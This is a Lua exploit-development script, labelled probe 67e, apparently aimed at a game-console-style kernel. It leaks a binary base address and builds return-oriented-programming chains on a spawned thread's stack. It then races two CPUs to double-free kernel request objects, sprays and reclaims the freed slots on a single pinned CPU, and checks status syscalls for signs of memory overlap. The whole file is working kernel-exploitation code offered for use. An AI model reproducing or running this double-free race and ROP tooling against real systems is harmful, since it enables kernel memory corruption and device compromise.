-- CRASH_CLASS: MODERATE
-- PROBE 67e: Force same-CPU reclaim and detect via 624 counter + status
--
-- 67d showed status UNCHANGED after delete+reclaim. Two hypotheses:
-- H1: 663 reads from a lookup table, not the tracking structure
-- H2: The reclaim went to the wrong CPU's cache
--
-- This probe tests H2 by:
-- 1. Race with mask=0x03 (need 2 CPUs for the double-free)
-- 2. Spray with mask=0x03 → get overlapping pairs
-- 3. PIN TO mask=0x01 before delete+reclaim
-- 4. Delete first members → frees to CPU 0's cache
-- 5. Submit many new requests → allocs from CPU 0's cache → reclaims
-- 6. Query second members → check for status change
--
-- Also measures sys_624 counter delta across operations.

print("=== PROBE 67e: FORCED SAME-CPU RECLAIM ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function w64(addr, lo, hi) wd(addr, lo or 0); wd(addr + 4, hi or 0) end
local function sgn(v) local l = N(v); if l >= 0x80000000 then l = l - 0x100000000 end; return l end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end) end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0

local function g(off) return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off)) end
local function g_lohi(off)
    local lo = eb_lo + off; local hi2 = eb_hi
    if lo >= 0x100000000 then hi2 = hi2 + math.floor(lo / 0x100000000); lo = lo % 0x100000000 end
    return lo, hi2
end

local pop_rax_ret = g(0x992)
local pop_rdi_ret = g(0xC9DFE)
local pop_rsi_ret = g(0xD77D)
local pop_rdx_ret = g(0x3B02D7)
local pop_rcx_ret = g(0xE64)
local mov_rdi_rax = g(0x92C67)
local bare_ret    = g(0x42)
local sf_lo, sf_hi = g_lohi(0x992)

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(uint64(N(sa) + 16), uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

local tcb_buf = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(tcb_buf) + i, 0) end
local tcb_mid = N(tcb_buf) + 0x800
wd(tcb_mid, tcb_mid % 0x100000000)
wd(tcb_mid + 4, math.floor(tcb_mid / 0x100000000))
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, uint64(tcb_mid))

local shared = memory.alloc(0x400)
for i = 0, 0x3FC, 4 do wd(N(shared) + i, 0) end

local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)
local pin_mask = memory.alloc(8)

local function set_cpu_mask(mask)
    wq(pin_mask, uint64(mask))
    pcall(function()
        mk(488)(uint64(3), uint64(2), uint64(pid_val), uint64(8), uint64(N(pin_mask)))
    end)
end

local function get_624()
    local ok, v = pcall(function() return mk(624)() end)
    return ok and N(v) or 0
end

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(uint64(N(reqs) + 8), uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function query_663(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEADDEAD)
    pcall(function() mk(663)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xDEADDEAD
end

local function poll_664(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0
end

local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xCD)
    pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xCD
end

local function spawn_662_child(ids_addr, count, states_addr, done_off)
    local CHILD_STK = 0x800
    local cstk = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(cstk) + i, 0) end
    local cbase = N(cstk)
    local sp = ((cbase + CHILD_STK) - ((cbase + CHILD_STK) % 16)) - 8
    local function push(val) wq(sp, val); sp = sp + 8 end
    push(uint64(165))
    push(pop_rdi_ret); push(uint64(129))
    push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)
    push(pop_rax_ret); push(uint64(662))
    push(pop_rdi_ret); push(uint64(ids_addr))
    push(pop_rsi_ret); push(uint64(count))
    push(pop_rdx_ret); push(uint64(states_addr))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)
    push(pop_rdi_ret); push(uint64(N(shared) + done_off + 8))
    push(mov_rdi_rax)
    push(pop_rdi_ret); push(uint64(N(shared) + done_off))
    push(pop_rax_ret); push(uint64(0xDDDD))
    push(mov_rdi_rax)
    push(pop_rax_ret); push(uint64(431))
    push(pop_rdi_ret); push(uint64(0))
    push(stub)
    wd(N(shared) + done_off, 0)
    local pa = memory.alloc(0x38)
    for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
    w64(N(pa), sf_lo, sf_hi)
    w64(N(pa) + 0x10, cbase % 0x100000000, math.floor(cbase / 0x100000000))
    w64(N(pa) + 0x18, CHILD_STK, 0)
    pcall(function() mk(455)(uint64(N(pa)), uint64(0x38)) end)
end

-- =============================================
-- [A] RACE WITH 2 CPUs
-- =============================================
print("")
print("-- [A] RACE (mask=0x03) --")
set_cpu_mask(3)

local BATCH = 16
local ids = memory.alloc(BATCH * 4)
local id_list = {}
for i = 0, BATCH - 1 do
    local id = submit_one()
    if id == 0 then break end
    wd(N(ids) + i * 4, id)
    id_list[#id_list + 1] = id
end

local poll_buf = memory.alloc(BATCH * 4)
pcall(function() mk(664)(uint64(N(ids)), uint64(BATCH), uint64(N(poll_buf))) end)

local main_st = memory.alloc(BATCH * 4)
local child_st = memory.alloc(BATCH * 4)
for i = 0, BATCH * 4 - 1, 4 do wd(N(main_st) + i, 0xCD); wd(N(child_st) + i, 0xCD) end

spawn_662_child(N(ids), BATCH, N(child_st), 0x100)
pcall(function() mk(662)(uint64(N(ids)), uint64(BATCH), uint64(N(main_st))) end)
for w = 1, 200000 do end

local doubles = 0
for i = 0, BATCH - 1 do
    local ms = rd(N(main_st) + i * 4) or 0xCD
    local cs = rd(N(child_st) + i * 4) or 0xCD
    if ms == 0 and cs == 0 then doubles = doubles + 1 end
end
print("doubles=" .. doubles)
if doubles < 2 then print("Insufficient doubles"); print("=== 67e DONE ==="); return end

-- =============================================
-- [B] SPRAY (mask=0x03) — get overlapping pairs
-- =============================================
print("")
print("-- [B] SPRAY (mask=0x03) --")

local spray_ids = {}
for i = 1, 128 do
    local id = submit_one()
    if id == 0 then break end
    spray_ids[#spray_ids + 1] = id
end

-- Baseline
local bl_bad = 0
for i = 1, #spray_ids do
    if query_663(spray_ids[i]) ~= 0x00000003 then bl_bad = bl_bad + 1 end
end

-- Overlap check
for i = 1, #spray_ids, 2 do poll_664(spray_ids[i]) end
local overlap = 0
for i = 2, #spray_ids, 2 do
    if query_663(spray_ids[i]) == 0x00010003 then overlap = overlap + 1 end
end
print(string.format("spray=%d bl_bad=%d overlap=%d/%d",
    #spray_ids, bl_bad, overlap, math.floor(#spray_ids / 2)))

if overlap < 4 then print("Insufficient overlap"); print("=== 67e DONE ==="); return end

-- =============================================
-- [C] PIN TO CPU 0 — force same-cache delete+reclaim
-- =============================================
print("")
print("-- [C] SINGLE-CPU DELETE + RECLAIM --")
set_cpu_mask(1)  -- CPU 0 only

-- Record 624 counter
local c624_before = get_624()

-- Delete ALL first members (32 pairs × first member)
local deleted = 0
for i = 1, #spray_ids, 2 do
    local ds = delete_one(spray_ids[i])
    if ds == 0 then deleted = deleted + 1 end
end
print("deleted_first_members=" .. deleted)

local c624_after_del = get_624()
print(string.format("  624 delta (delete): %d", c624_after_del - c624_before))

-- Query second members BEFORE reclaim
print("")
print("  Before reclaim:")
local status_before = {}
for k = 1, 8 do
    local idx = 2 * k
    local st = query_663(spray_ids[idx])
    status_before[k] = st
    print(string.format("    pair[%d] id=%d 663=%08X", k, spray_ids[idx], st))
end

-- RECLAIM: submit many new requests ON THE SAME CPU
local c624_before_recl = get_624()
local reclaim_ids = {}
for i = 1, 128 do
    local id = submit_one()
    if id == 0 then break end
    reclaim_ids[#reclaim_ids + 1] = id
end
local c624_after_recl = get_624()
print(string.format("\n  reclaim_count=%d  624 delta (reclaim): %d",
    #reclaim_ids, c624_after_recl - c624_before_recl))

-- Query second members AFTER reclaim
print("")
print("  After reclaim:")
local any_changed = false
for k = 1, 8 do
    local idx = 2 * k
    local st = query_663(spray_ids[idx])
    local changed = (st ~= status_before[k]) and " ★CHANGED" or ""
    if changed ~= "" then any_changed = true end
    print(string.format("    pair[%d] id=%d 663=%08X (was=%08X)%s",
        k, spray_ids[idx], st, status_before[k], changed))
end

-- =============================================
-- [D] CONTROL TEST — normal (non-overlapping) IDs
-- =============================================
if alive() then
    print("")
    print("-- [D] CONTROL: normal IDs (no double-free) --")
    -- Submit 4 IDs, poll first 2, check if 3rd/4th show polled
    local ctrl = {}
    for i = 1, 4 do
        local id = submit_one()
        if id ~= 0 then ctrl[#ctrl + 1] = id end
    end
    if #ctrl == 4 then
        -- Check baseline
        local c1 = query_663(ctrl[1])
        local c2 = query_663(ctrl[2])
        local c3 = query_663(ctrl[3])
        local c4 = query_663(ctrl[4])
        print(string.format("  baseline: %08X %08X %08X %08X", c1, c2, c3, c4))

        -- Poll first 2
        poll_664(ctrl[1])
        poll_664(ctrl[2])

        -- Check all 4
        c1 = query_663(ctrl[1])
        c2 = query_663(ctrl[2])
        c3 = query_663(ctrl[3])
        c4 = query_663(ctrl[4])
        print(string.format("  after poll 1,2: %08X %08X %08X %08X", c1, c2, c3, c4))

        -- Cleanup
        for _, id in ipairs(ctrl) do poll_664(id); delete_one(id) end
    end
end

-- =============================================
-- [E] DELETE SECOND MEMBERS (chain free)
-- =============================================
if alive() then
    print("")
    print("-- [E] DELETE SECOND MEMBERS --")
    local del2 = 0
    local del2_fail = 0
    for i = 2, #spray_ids, 2 do
        -- Already polled (from overlap check)
        local ds = delete_one(spray_ids[i])
        if ds == 0 then del2 = del2 + 1
        else del2_fail = del2_fail + 1 end
    end
    print(string.format("  second_del: ok=%d fail=%d", del2, del2_fail))
    print("  alive=" .. (alive() and "YES" or "NO"))

    -- After deleting both members, try querying with DELETED IDs
    -- Should get 0x80020003 (unknown)
    if alive() and #spray_ids >= 4 then
        local st_dead1 = query_663(spray_ids[1])
        local st_dead2 = query_663(spray_ids[2])
        print(string.format("  query deleted: first=%08X second=%08X", st_dead1, st_dead2))
    end
end

-- =============================================
-- [F] CLEANUP
-- =============================================
if alive() then
    print("")
    print("-- [F] CLEANUP --")
    for _, id in ipairs(reclaim_ids) do poll_664(id); delete_one(id) end
    print("reclaim cleanup done")
end

print("alive=" .. (alive() and "YES" or "NO"))
print("=== 67e DONE ===")
